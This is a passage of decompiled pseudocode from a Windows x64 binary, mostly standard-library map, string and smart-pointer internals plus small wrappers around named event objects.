  v4 = sub_14000DB10(&Src, v2, &unk_1400A3218);
  v5 = sub_14000DAC0(&v14, v4, &Buffer);
  v6 = sub_14001E200(&v11, v5);
  if ( (_QWORD *)v3 != v6 )
  {
    if ( *(_QWORD *)(v3 + 24) >= 0x10ui64 )
      operator delete(*(void **)v3);
    *(_QWORD *)(v3 + 24) = 15i64;
    *(_QWORD *)(v3 + 16) = 0i64;
    *(_BYTE *)v3 = 0;
    sub_140004720((_QWORD *)v3, v6);
  }
  if ( v13 >= 0x10 )
    operator delete(v11);
  v13 = 15i64;
  v12 = 0i64;
  LOBYTE(v11) = 0;
  if ( v16 >= 0x10 )
    operator delete(v14);
  v16 = 15i64;
  v15 = 0i64;
  LOBYTE(v14) = 0;
  if ( v18 >= 0x10 )
    operator delete(Src);
  return v3;
}

//----- (000000014000DD60) ----------------------------------------------------
void __fastcall sub_14000DD60(__int64 a1)
{
  __int64 v1; // rbx
  void *v2; // rcx

  v1 = a1;
  v2 = *(void **)(a1 + 32);
  if ( v2 )
  {
    CloseHandle(v2);
    *(_QWORD *)(v1 + 32) = 0i64;
  }
  if ( *(_QWORD *)(v1 + 24) >= 0x10ui64 )
    operator delete(*(void **)v1);
  *(_QWORD *)(v1 + 24) = 15i64;
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_BYTE *)v1 = 0;
}

//----- (000000014000DDC0) ----------------------------------------------------
BOOL __fastcall sub_14000DDC0(__int64 a1)
{
  __int64 v1; // rbx
  void *v2; // rcx
  BOOL result; // eax

  v1 = a1;
  v2 = *(void **)(a1 + 32);
  if ( v2 )
  {
    result = CloseHandle(v2);
    *(_QWORD *)(v1 + 32) = 0i64;
  }
  return result;
}

//----- (000000014000DDF0) ----------------------------------------------------
bool __fastcall sub_14000DDF0(LPCSTR lpName)
{
  HANDLE *v1; // rbx
  bool result; // al

  v1 = (HANDLE *)(lpName + 32);
  if ( !*((_QWORD *)lpName + 4) )
  {
    if ( *((_QWORD *)lpName + 3) >= 0x10ui64 )
      lpName = *(LPCSTR *)lpName;
    *v1 = CreateEventA(0i64, 0, 0, lpName);
  }
  if ( *v1 )
    result = SetEvent(*v1) == 1;
  else
    result = 0;
  return result;
}

//----- (000000014000DE40) ----------------------------------------------------
bool __fastcall sub_14000DE40(LPCSTR lpName, DWORD dwMilliseconds)
{
  HANDLE *v2; // rbx
  DWORD v3; // edi
  bool result; // al

  v2 = (HANDLE *)(lpName + 32);
  v3 = dwMilliseconds;
  if ( !*((_QWORD *)lpName + 4) )
  {
    if ( *((_QWORD *)lpName + 3) >= 0x10ui64 )
      lpName = *(LPCSTR *)lpName;
    *v2 = CreateEventA(0i64, 0, 0, lpName);
  }
  if ( *v2 )
    result = WaitForSingleObject(*v2, v3) == 0;
  else
    result = 0;
  return result;
}

//----- (000000014000DF00) ----------------------------------------------------
_QWORD *__fastcall sub_14000DF00(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = off_1400A3370;
    *((_QWORD *)v4 + 2) = v2;
  }
  *v3 = v4;
  return v3;
}
// 1400A3370: using guessed type __int64 (__fastcall *off_1400A3370[5])();

//----- (000000014000DF70) ----------------------------------------------------
_QWORD *__fastcall sub_14000DF70(_QWORD *a1, __int64 a2, _DWORD **a3)
{
  _DWORD **v3; // rbx
  _QWORD *result; // rax

  v3 = a3;
  result = sub_14000E9E0(a1);
  *((_WORD *)result + 12) = 0;
  if ( result != (_QWORD *)-32i64 )
  {
    *((_DWORD *)result + 8) = **v3;
    result[5] = 0i64;
    result[6] = 0i64;
  }
  return result;
}

//----- (000000014000DFC0) ----------------------------------------------------
volatile signed __int32 *__fastcall sub_14000DFC0(_QWORD *a1, volatile signed __int32 *a2, void *a3, _QWORD *a4, __int64 a5, _QWORD *a6)
{
  unsigned __int64 v6; // rax
  _QWORD *v7; // r10
  volatile signed __int32 *v8; // rbx
  __int64 v9; // rax
  _QWORD *v10; // rax
  __int64 *v11; // rcx
  __int64 *v12; // r8
  __int64 *v13; // rdx
  __int64 v14; // rdx
  _QWORD *v15; // rdx
  _QWORD *v16; // rcx
  _QWORD *v17; // rdx
  _QWORD *v18; // r8
  __int64 v19; // rcx
  _QWORD *v20; // rcx
  __int64 v21; // rdx
  __int64 v22; // rcx
  _QWORD *v23; // rcx
  _QWORD *v24; // rcx
  __int64 v25; // rax
  __int64 v26; // rcx
  volatile signed __int32 *result; // rax

  v6 = a1[1];
  v7 = a1;
  v8 = a2;
  if ( v6 >= 0x492492492492491i64 )
  {
    v8 = (volatile signed __int32 *)a6[6];
    if ( v8 )
    {
      if ( !_InterlockedDecrement(v8 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *, volatile signed __int32 *, void *))(*(_QWORD *)v8 + 8i64))(
          v8,
          a2,
          a3);
        if ( !_InterlockedDecrement(v8 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v8 + 16i64))(v8);
      }
    }
    operator delete(a6);
    std::_Xlength_error("map/set<T> too long");
  }
  v7[1] = v6 + 1;
  a6[1] = a4;
  if ( a4 == (_QWORD *)*v7 )
  {
    *(_QWORD *)(*v7 + 8i64) = a6;
    *(_QWORD *)*v7 = a6;
    v9 = *v7;
LABEL_13:
    *(_QWORD *)(v9 + 16) = a6;
    goto LABEL_14;
  }
  if ( !(_BYTE)a3 )
  {
    a4[2] = a6;
    v9 = *v7;
    if ( a4 != *(_QWORD **)(*v7 + 16i64) )
      goto LABEL_14;
    goto LABEL_13;
  }
  *a4 = a6;
  if ( a4 == *(_QWORD **)*v7 )
    *(_QWORD *)*v7 = a6;
LABEL_14:
  v10 = a6;
  while ( !*(_BYTE *)(v10[1] + 24i64) )
  {
    v11 = (__int64 *)v10[1];
    v12 = (__int64 *)v11[1];
    v13 = (__int64 *)*v12;
    if ( v11 == (__int64 *)*v12 )
    {
      v14 = v12[2];
      if ( *(_BYTE *)(v14 + 24) )
      {
        if ( v10 == (_QWORD *)v11[2] )
        {
          v15 = (_QWORD *)v11[2];
          v10 = (_QWORD *)v10[1];
          v11[2] = *v15;
          if ( !*(_BYTE *)(*v15 + 25i64) )
            *(_QWORD *)(*v15 + 8i64) = v11;
          v15[1] = v11[1];
          if ( v11 == *(__int64 **)(*v7 + 8i64) )
          {
            *(_QWORD *)(*v7 + 8i64) = v15;
          }
          else
          {
            v16 = (_QWORD *)v11[1];
            if ( v10 == (_QWORD *)*v16 )
              *v16 = v15;
            else
              v16[2] = v15;
          }
          *v15 = v10;
          v10[1] = v15;
        }
        *(_BYTE *)(v10[1] + 24i64) = 1;
        *(_BYTE *)(*(_QWORD *)(v10[1] + 8i64) + 24i64) = 0;
        v17 = *(_QWORD **)(v10[1] + 8i64);
        v18 = (_QWORD *)*v17;
        *v17 = *(_QWORD *)(*v17 + 16i64);
        v19 = v18[2];
        if ( !*(_BYTE *)(v19 + 25) )
          *(_QWORD *)(v19 + 8) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_QWORD **)(*v7 + 8i64) )
        {
          *(_QWORD *)(*v7 + 8i64) = v18;
          v18[2] = v17;
        }
        else
        {
          v20 = (_QWORD *)v17[1];
          if ( v17 == (_QWORD *)v20[2] )
            v20[2] = v18;
          else
            *v20 = v18;
          v18[2] = v17;
        }
LABEL_54:
        v17[1] = v18;
        continue;
      }
      *((_BYTE *)v11 + 24) = 1;
      *(_BYTE *)(v14 + 24) = 1;
      *(_BYTE *)(*(_QWORD *)(v10[1] + 8i64) + 24i64) = 0;
      v10 = *(_QWORD **)(v10[1] + 8i64);
    }
    else
    {
      if ( *((_BYTE *)v13 + 24) )
      {
        if ( v10 == (_QWORD *)*v11 )
        {
          v21 = *v11;
          v10 = (_QWORD *)v10[1];
          *v11 = *(_QWORD *)(*v11 + 16);
          v22 = *(_QWORD *)(v21 + 16);
          if ( !*(_BYTE *)(v22 + 25) )
            *(_QWORD *)(v22 + 8) = v10;
          *(_QWORD *)(v21 + 8) = v10[1];
          if ( v10 == *(_QWORD **)(*v7 + 8i64) )
          {
            *(_QWORD *)(*v7 + 8i64) = v21;
          }
          else
          {
            v23 = (_QWORD *)v10[1];
            if ( v10 == (_QWORD *)v23[2] )
              v23[2] = v21;
            else
              *v23 = v21;
          }
          *(_QWORD *)(v21 + 16) = v10;
          v10[1] = v21;
        }
        *(_BYTE *)(v10[1] + 24i64) = 1;
        *(_BYTE *)(*(_QWORD *)(v10[1] + 8i64) + 24i64) = 0;
        v17 = *(_QWORD **)(v10[1] + 8i64);
        v18 = (_QWORD *)v17[2];
        v17[2] = *v18;
        if ( !*(_BYTE *)(*v18 + 25i64) )
          *(_QWORD *)(*v18 + 8i64) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_QWORD **)(*v7 + 8i64) )
        {
          *(_QWORD *)(*v7 + 8i64) = v18;
        }
        else
        {
          v24 = (_QWORD *)v17[1];
          if ( v17 == (_QWORD *)*v24 )
            *v24 = v18;
          else
            v24[2] = v18;
        }
        *v18 = v17;
        goto LABEL_54;
      }
      *((_BYTE *)v11 + 24) = 1;
      *((_BYTE *)v13 + 24) = 1;
      *(_BYTE *)(*(_QWORD *)(v10[1] + 8i64) + 24i64) = 0;
      v10 = *(_QWORD **)(v10[1] + 8i64);
    }
  }
  v25 = *v7;
  *(_QWORD *)v8 = a6;
  v26 = *(_QWORD *)(v25 + 8);
  result = v8;
  *(_BYTE *)(v26 + 24) = 1;
  return result;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014000E2A0) ----------------------------------------------------
volatile signed __int32 *__usercall sub_14000E2A0@<rax>(volatile signed __int32 *a1@<rdx>, __int64 **a2@<rcx>, __int64 *a3@<r8>, int *a4@<r9>, __int64 a5)
{
  int *v5; // r11
  volatile signed __int32 *v6; // rbx
  __int64 **v7; // r10
  __int64 *v9; // rcx
  int *v10; // ST20_8
  __int64 *v11; // r9
  __int64 v12; // r9
  int v13; // esi
  bool v14; // sf
  unsigned __int8 v15; // of
  __int64 *v16; // rax
  __int64 v17; // r9
  __int64 j; // rax
  __int64 i; // rdx
  __int64 *v20; // r9
  __int64 *v21; // r9
  __int64 v22; // rax
  __int64 l; // rax
  __int64 k; // rax
  char v25; // [rsp+38h] [rbp-20h]

  v5 = a4;
  v6 = a1;
  v7 = a2;
  if ( !a2[1] )
  {
    LOBYTE(a3) = 1;
    sub_14000DFC0(a2, a1, a3, *a2, (__int64)a4, (_QWORD *)a5);
    return v6;
  }
  v9 = *a2;
  if ( a3 == (__int64 *)*v9 )
  {
    if ( *a4 < *((_DWORD *)a3 + 8) )
    {
      v10 = a4;
      v11 = a3;
      LOBYTE(a3) = 1;
      sub_14000DFC0(v7, a1, a3, v11, (__int64)v10, (_QWORD *)a5);
      return v6;
    }
    goto LABEL_43;
  }
  if ( a3 == v9 )
  {
    v12 = v9[2];
    if ( *(_DWORD *)(v12 + 32) < *v5 )
    {
      sub_14000DFC0(v7, a1, 0i64, (_QWORD *)v12, (__int64)v5, (_QWORD *)a5);
      return v6;
    }
    goto LABEL_43;
  }
  v13 = *a4;
  v15 = __OFSUB__(*((_DWORD *)a3 + 8), *a4);
  v14 = *((_DWORD *)a3 + 8) - *a4 < 0;
  if ( *((_DWORD *)a3 + 8) > *a4 )
  {
    v16 = a3;
    if ( *((_BYTE *)a3 + 25) )
    {
      v17 = a3[2];
    }
    else
    {
      v17 = *a3;
      if ( *(_BYTE *)(*a3 + 25) )
      {
        for ( i = a3[1]; !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
        {
          if ( v16 != *(__int64 **)i )
            break;
          v16 = (__int64 *)i;
        }
        v17 = (__int64)v16;
        if ( !*((_BYTE *)v16 + 25) )
          v17 = i;
      }
      else
      {
        for ( j = *(_QWORD *)(v17 + 16); !*(_BYTE *)(j + 25); j = *(_QWORD *)(j + 16) )
          v17 = j;
      }
    }
    if ( *(_DWORD *)(v17 + 32) < v13 )
    {
      if ( *(_BYTE *)(*(_QWORD *)(v17 + 16) + 25i64) )
      {
        sub_14000DFC0(v7, v6, 0i64, (_QWORD *)v17, (__int64)v5, (_QWORD *)a5);
      }
      else
      {
        v20 = a3;
        LOBYTE(a3) = 1;
        sub_14000DFC0(v7, v6, a3, v20, (__int64)v5, (_QWORD *)a5);
      }
      return v6;
    }
    v15 = __OFSUB__(*((_DWORD *)a3 + 8), v13);
    v14 = *((_DWORD *)a3 + 8) - v13 < 0;
  }
  if ( !(v14 ^ v15) )
    goto LABEL_43;
  v21 = a3;
  if ( !*((_BYTE *)a3 + 25) )
  {
    v22 = a3[2];
    if ( *(_BYTE *)(v22 + 25) )
    {
      for ( k = a3[1]; !*(_BYTE *)(k + 25); k = *(_QWORD *)(k + 8) )
      {
        if ( v21 != *(__int64 **)(k + 16) )
          break;
        v21 = (__int64 *)k;
      }
      v21 = (__int64 *)k;
    }
    else
    {
      v21 = (__int64 *)a3[2];
      for ( l = *(_QWORD *)v22; !*(_BYTE *)(l + 25); l = *(_QWORD *)l )
        v21 = (__int64 *)l;
    }
  }
  if ( v21 != v9 && v13 >= *((_DWORD *)v21 + 8) )
  {
LABEL_43:
    *(_QWORD *)v6 = *(_QWORD *)sub_14000E510(v7, (__int64)&v25, 0i64, v5, (volatile signed __int32 **)a5);
    return v6;
  }
  if ( *(_BYTE *)(a3[2] + 25) )
  {
    sub_14000DFC0(v7, v6, 0i64, a3, (__int64)v5, (_QWORD *)a5);
  }
  else
  {
    LOBYTE(a3) = 1;
    sub_14000DFC0(v7, v6, a3, v21, (__int64)v5, (_QWORD *)a5);
  }
  return v6;
}

//----- (000000014000E510) ----------------------------------------------------
__int64 __fastcall sub_14000E510(__int64 **a1, __int64 a2, void *a3, int *a4, volatile signed __int32 **a5)
{
  int *v5; // rsi
  char v6; // r10
  __int64 v7; // rdi
  __int64 v8; // rax
  __int64 *v9; // r9
  int v10; // edx
  __int64 v11; // rbx
  __int64 j; // rax
  __int64 i; // rax
  int v15; // [rsp+38h] [rbp-10h]

  v5 = a4;
  v6 = (char)a3;
  v7 = a2;
  v8 = (*a1)[1];
  v9 = *a1;
  LOBYTE(a3) = 1;
  if ( !*(_BYTE *)(v8 + 25) )
  {
    v10 = *v5;
    do
    {
      v9 = (__int64 *)v8;
      if ( v6 )
        LOBYTE(a3) = *(_DWORD *)(v8 + 32) >= v10;
      else
        LOBYTE(a3) = v10 < *(_DWORD *)(v8 + 32);
      if ( (_BYTE)a3 )
        v8 = *(_QWORD *)v8;
      else
        v8 = *(_QWORD *)(v8 + 16);
    }
    while ( !*(_BYTE *)(v8 + 25) );
  }
  v11 = (__int64)v9;
  if ( (_BYTE)a3 )
  {
    if ( v9 == (__int64 *)**a1 )
    {
      LOBYTE(a3) = 1;
      *(_QWORD *)v7 = *(_QWORD *)sub_14000DFC0(a1, &v15, a3, v9, (__int64)v5, a5);
      *(_BYTE *)(v7 + 8) = 1;
      return v7;
    }
    if ( *((_BYTE *)v9 + 25) )
    {
      v11 = v9[2];
    }
    else if ( *(_BYTE *)(*v9 + 25) )
    {
      for ( i = v9[1]; !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
      {
        if ( v11 != *(_QWORD *)i )
          break;
        v11 = i;
      }
      if ( !*(_BYTE *)(v11 + 25) )
        v11 = i;
    }
    else
    {
      v11 = *v9;
      for ( j = *(_QWORD *)(*v9 + 16); !*(_BYTE *)(j + 25); j = *(_QWORD *)(j + 16) )
        v11 = j;
    }
  }
  if ( *(_DWORD *)(v11 + 32) >= *v5 )
  {
    sub_14000EA40((__int64)a1, a5);
    *(_QWORD *)v7 = v11;
    *(_BYTE *)(v7 + 8) = 0;
  }
  else
  {
    *(_QWORD *)v7 = *(_QWORD *)sub_14000DFC0(a1, &v15, a3, v9, (__int64)v5, a5);
    *(_BYTE *)(v7 + 8) = 1;
  }
  return v7;
}

//----- (000000014000E670) ----------------------------------------------------
void __fastcall sub_14000E670(__int64 a1, __int64 a2, __int64 *a3)
{
  __int64 *v3; // rbx
  __int64 *v4; // rax
  __int64 v5; // r10
  volatile signed __int32 *v6; // rbx
  volatile signed __int32 *v7; // [rsp+40h] [rbp+18h]

  v3 = a3;
  v4 = sub_14000DF00(&v7, a2);
  v5 = *v3;
  *v3 = *v4;
  *v4 = v5;
  v6 = v7;
  if ( v7 )
  {
    if ( !_InterlockedDecrement(v7 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 8i64))(v6);
      if ( !_InterlockedDecrement(v6 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 16i64))(v6);
    }
  }
  sub_140008430();
}

//----- (000000014000E6F0) ----------------------------------------------------
_QWORD *__fastcall sub_14000E6F0(_QWORD *a1)
{
  _QWORD *v1; // rsi
  _DWORD *v2; // rax
  __int64 v3; // rax

  v1 = a1;
  *a1 = &off_1400A3360;
  v2 = operator new(4ui64);
  if ( v2 )
    *v2 = 0;
  v1[1] = v2;
  v1[2] = 0i64;
  sub_14000E670((__int64)(v1 + 1), (__int64)v2, v1 + 2);
  v1[3] = 0i64;
  v1[4] = 0i64;
  sub_14000E990();
  v1[3] = v3;
  return v1;
}
// 1400A3360: using guessed type __int64 (__fastcall *off_1400A3360)(void *);

//----- (000000014000E780) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_14000E780(__int64 a1))()
{
  __int64 v1; // rsi
  volatile signed __int32 *v2; // rbx
  __int64 (__fastcall **result)(); // rax
  char v4; // [rsp+48h] [rbp+10h]

  v1 = a1;
  sub_14000EB20((__int64 **)(a1 + 24), (__int64 *)&v4, **(_QWORD **)(a1 + 24), *(_QWORD *)(a1 + 24));
  operator delete(*(void **)(v1 + 24));
  v2 = *(volatile signed __int32 **)(v1 + 16);
  if ( v2 )
  {
    if ( !_InterlockedDecrement(v2 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
      if ( !_InterlockedDecrement(v2 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 16i64))(v2);
    }
  }
  result = &off_1400B0E50;
  *(_QWORD *)v1 = &off_1400B0E50;
  return result;
}
// 1400B0E50: using guessed type __int64 (__fastcall *off_1400B0E50)();

//----- (000000014000E810) ----------------------------------------------------
__int64 *__fastcall sub_14000E810(__int64 **a1, _DWORD *a2)
{
  __int64 **v2; // rdi
  __int64 v3; // rax
  __int64 *v4; // rbx
  int *v6; // rax
  int v7; // [rsp+40h] [rbp+8h]
  _DWORD *v8; // [rsp+50h] [rbp+18h]

  v2 = a1;
  v3 = (*a1)[1];
  v4 = *a1;
  while ( !*(_BYTE *)(v3 + 25) )
  {
    if ( *(_DWORD *)(v3 + 32) >= *a2 )
    {
      v4 = (__int64 *)v3;
      v3 = *(_QWORD *)v3;
    }
    else
    {
      v3 = *(_QWORD *)(v3 + 16);
    }
  }
  if ( v4 != *a1 && *a2 >= *((_DWORD *)v4 + 8) )
    return v4 + 5;
  v8 = a2;
  v6 = (int *)sub_14000DF70(a1, (__int64)&unk_1400D9BB7, &v8);
  sub_14000E2A0(&v7, v2, v4, v6 + 8, (__int64)v6);
  return (__int64 *)(*(_QWORD *)&v7 + 40i64);
}

//----- (000000014000E8B0) ----------------------------------------------------
void *__fastcall sub_14000E8B0(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14000E780((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014000E8E0) ----------------------------------------------------
char __fastcall sub_14000E8E0(__int64 a1, _DWORD *a2, __int64 *a3)
{
  __int64 *v3; // rbx
  __int64 *v4; // rax

  v3 = a3;
  if ( !*a3 )
    return 0;
  v4 = sub_14000E810((__int64 **)(a1 + 24), a2);
  sub_140011A50(v4, v3);
  return 1;
}

//----- (000000014000E920) ----------------------------------------------------
char __fastcall sub_14000E920(__int64 a1)
{
  int v1; // er8
  __int64 v2; // r9
  __int64 v3; // rdx
  __int64 v4; // rax
  __int64 *v5; // rax
  __int64 v6; // rax
  char result; // al
  __int64 v8; // [rsp+8h] [rbp+8h]
  __int64 v9; // [rsp+10h] [rbp+10h]

  v1 = **(_DWORD **)(a1 + 8);
  v2 = *(_QWORD *)(a1 + 24);
  v3 = v2;
  v4 = *(_QWORD *)(v2 + 8);
  while ( !*(_BYTE *)(v4 + 25) )
  {
    if ( *(_DWORD *)(v4 + 32) >= v1 )
    {
      v3 = v4;
      v4 = *(_QWORD *)v4;
    }
    else
    {
      v4 = *(_QWORD *)(v4 + 16);
    }
  }
  if ( v3 == v2 || v1 < *(_DWORD *)(v3 + 32) )
  {
    v9 = *(_QWORD *)(a1 + 24);
    v5 = &v9;
  }
  else
  {
    v8 = v3;
    v5 = &v8;
  }
  v6 = *v5;
  if ( v6 == v2 )
    result = 0;
  else
    result = (*(__int64 (**)(void))(**(_QWORD **)(v6 + 40) + 8i64))();
  return result;
}

//----- (000000014000E990) ----------------------------------------------------
void sub_14000E990()
{
  _QWORD *v0; // rax

  v0 = operator new(0x38ui64);
  if ( !v0 )
    std::_Xbad_alloc();
  *v0 = v0;
  if ( v0 != (_QWORD *)-8i64 )
    v0[1] = v0;
  if ( v0 != (_QWORD *)-16i64 )
    v0[2] = v0;
  *((_WORD *)v0 + 12) = 257;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014000E9E0) ----------------------------------------------------
_QWORD *__fastcall sub_14000E9E0(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rdx

  v1 = a1;
  v2 = operator new(0x38ui64);
  if ( !v2 )
    std::_Xbad_alloc();
  *v2 = *v1;
  if ( v2 != (_QWORD *)-8i64 )
    v2[1] = *v1;
  if ( v2 != (_QWORD *)-16i64 )
    v2[2] = *v1;
  return v2;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014000EA40) ----------------------------------------------------
void __fastcall sub_14000EA40(__int64 a1, volatile signed __int32 **a2)
{
  volatile signed __int32 *v2; // rbx
  volatile signed __int32 **v3; // rsi

  v2 = a2[6];
  v3 = a2;
  if ( v2 )
  {
    if ( !_InterlockedDecrement(v2 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
      if ( !_InterlockedDecrement(v2 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 16i64))(v2);
    }
  }
  operator delete(v3);
}

//----- (000000014000EA90) ----------------------------------------------------
void __fastcall sub_14000EA90(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rsi
  __int64 v3; // rbp
  _QWORD *i; // rdi
  volatile signed __int32 *v5; // rbx

  v2 = a2;
  v3 = a1;
  for ( i = a2; !*((_BYTE *)i + 25); v2 = i )
  {
    sub_14000EA90(v3, i[2]);
    v5 = (volatile signed __int32 *)v2[6];
    i = (_QWORD *)*i;
    if ( v5 && !_InterlockedDecrement(v5 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v5 + 8i64))(v5);
      if ( !_InterlockedDecrement(v5 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v5 + 16i64))(v5);
    }
    operator delete(v2);
  }
}

//----- (000000014000EB10) ----------------------------------------------------
void __fastcall sub_14000EB10(__int64 a1)
{
  operator delete(*(void **)(a1 + 16));
}

//----- (000000014000EB20) ----------------------------------------------------
__int64 *__fastcall sub_14000EB20(__int64 **a1, __int64 *a2, __int64 a3, __int64 a4)
{
  __int64 *v4; // rdi
  __int64 *v5; // rdx
  __int64 **v6; // rbx
  __int64 *v7; // rax
  __int64 v8; // rcx
  __int64 *result; // rax
  __int64 v10; // rax
  __int64 v11; // rdx
  __int64 j; // rcx
  __int64 i; // rcx
  char v14; // [rsp+30h] [rbp+8h]
  __int64 v15; // [rsp+40h] [rbp+18h]
  __int64 v16; // [rsp+48h] [rbp+20h]

  v16 = a4;
  v15 = a3;
  v4 = a2;
  v5 = *a1;
  v6 = a1;
  if ( a3 != **a1 || (__int64 *)a4 != v5 )
  {
    if ( a3 != a4 )
    {
      do
      {
        v10 = a3;
        if ( !*(_BYTE *)(a3 + 25) )
        {
          v11 = *(_QWORD *)(a3 + 16);
          if ( *(_BYTE *)(v11 + 25) )
          {
            for ( i = *(_QWORD *)(a3 + 8); !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
            {
              if ( a3 != *(_QWORD *)(i + 16) )
                break;
              v15 = i;
              a3 = i;
            }
            v15 = i;
          }
          else
          {
            for ( j = *(_QWORD *)v11; !*(_BYTE *)(j + 25); j = *(_QWORD *)j )
              v11 = j;
            v15 = v11;
          }
        }
        sub_14001CBD0(v6, (__int64 *)&v14, v10);
        a3 = v15;
      }
      while ( v15 != v16 );
    }
    *v4 = a3;
    result = v4;
  }
  else
  {
    sub_14000EA90((__int64)a1, (_QWORD *)v5[1]);
    (*v6)[1] = (__int64)*v6;
    **v6 = (__int64)*v6;
    (*v6)[2] = (__int64)*v6;
    v7 = *v6;
    v6[1] = 0i64;
    v8 = *v7;
    result = v4;
    *v4 = v8;
  }
  return result;
}

//----- (000000014000EC20) ----------------------------------------------------
_QWORD *__fastcall sub_14000EC20(_QWORD *a1, _QWORD *a2, _QWORD *a3)
{
  _QWORD *v3; // rbx
  _QWORD *v4; // rdi
  _QWORD *v5; // rcx
  signed __int64 v6; // rcx

  v3 = a3;
  v4 = a1;
  *a1 = &off_1400A3408;
  v5 = a1 + 1;
  v5[3] = 7i64;
  v5[2] = 0i64;
  *(_WORD *)v5 = 0;
  sub_140005050(v5, a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v6 = (signed __int64)(v4 + 5);
  *(_QWORD *)(v6 + 24) = 15i64;
  *(_QWORD *)(v6 + 16) = 0i64;
  *(_BYTE *)v6 = 0;
  sub_140004DF0(v4 + 5, v3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v4;
}
// 1400A3408: using guessed type __int64 (__fastcall *off_1400A3408)(void *);

//----- (000000014000ECB0) ----------------------------------------------------
void *__fastcall sub_14000ECB0(void *a1, char a2)
{
  char v2; // di
  void *v3; // rbx

  v2 = a2;
  v3 = a1;
  if ( *((_QWORD *)a1 + 8) >= 0x10ui64 )
    operator delete(*((void **)a1 + 5));
  *((_QWORD *)v3 + 8) = 15i64;
  *((_QWORD *)v3 + 7) = 0i64;
  *((_BYTE *)v3 + 40) = 0;
  if ( *((_QWORD *)v3 + 4) >= 8ui64 )
    operator delete(*((void **)v3 + 1));
  *((_QWORD *)v3 + 4) = 7i64;
  *((_QWORD *)v3 + 3) = 0i64;
  *((_WORD *)v3 + 4) = 0;
  *(_QWORD *)v3 = &off_1400B0E50;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400B0E50: using guessed type __int64 (__fastcall *off_1400B0E50)();

//----- (000000014000ED40) ----------------------------------------------------
char __fastcall sub_14000ED40(_QWORD *a1)
{
  _QWORD *v1; // rdi
  _QWORD *v2; // rax
  bool v3; // bl
  char result; // al
  char *v5; // rax
  __int64 v6; // rdx
  __int64 v7; // rcx
  char *v8; // rbx
  __int64 v9; // r14
  unsigned __int64 v10; // rax
  char *v11; // rsi
  __int64 v12; // rax
  const CHAR *v13; // rax
  bool v14; // bl
  void *v15; // [rsp+10h] [rbp-41h]
  __int64 v16; // [rsp+20h] [rbp-31h]
  unsigned __int64 v17; // [rsp+28h] [rbp-29h]
  void *Src; // [rsp+30h] [rbp-21h]
  unsigned __int64 v19; // [rsp+48h] [rbp-9h]
  void *v20; // [rsp+50h] [rbp-1h]
  __int64 v21; // [rsp+60h] [rbp+Fh]
  unsigned __int64 v22; // [rsp+68h] [rbp+17h]
  void *v23; // [rsp+70h] [rbp+1Fh]
  __int64 v24; // [rsp+80h] [rbp+2Fh]
  unsigned __int64 v25; // [rsp+88h] [rbp+37h]

  v1 = a1;
  v2 = sub_140009FC0(&v19);
  v3 = (unsigned int)sub_14000B9E0(v1 + 5, v2) == 0;
  if ( v19 >= 0x10 )
    operator delete(Src);
  if ( v3 )
  {
    sub_14000A900();
    result = sub_14000B000();
  }
  else if ( v1[3] )
  {
    v5 = (char *)sub_14000EF00(&v20);
    v8 = v5;
    v17 = 7i64;
    v16 = 0i64;
    LOWORD(v15) = 0;
    v9 = *((_QWORD *)v5 + 2);
    if ( v9 )
    {
      v10 = *((_QWORD *)v5 + 3);
      if ( v10 < 0x10 )
        v11 = v8;
      else
        v11 = *(char **)v8;
      if ( v10 >= 0x10 )
        v8 = *(char **)v8;
      v12 = sub_140031970(v7, v6);
      sub_140030C60(v8, &v11[v9], &v15, v12);
    }
    sub_140003DE0(&Src, v1 + 1, &v15);
    if ( v17 >= 8 )
      operator delete(v15);
    v17 = 7i64;
    v16 = 0i64;
    LOWORD(v15) = 0;
    if ( v22 >= 0x10 )
      operator delete(v20);
    v22 = 15i64;
    v21 = 0i64;
    LOBYTE(v20) = 0;
    v13 = (const CHAR *)sub_1400054F0(&Src, &v23);
    if ( *((_QWORD *)v13 + 3) >= 0x10ui64 )
      v13 = *(const CHAR **)v13;
    v14 = sub_14001E540(v13, byte_1400A3400);
    if ( v25 >= 0x10 )
      operator delete(v23);
    v25 = 15i64;
    v24 = 0i64;
    LOBYTE(v23) = 0;
    if ( v19 >= 8 )
      operator delete(Src);
    result = v14;
  }
  else
  {
    result = 0;
  }
  return result;
}
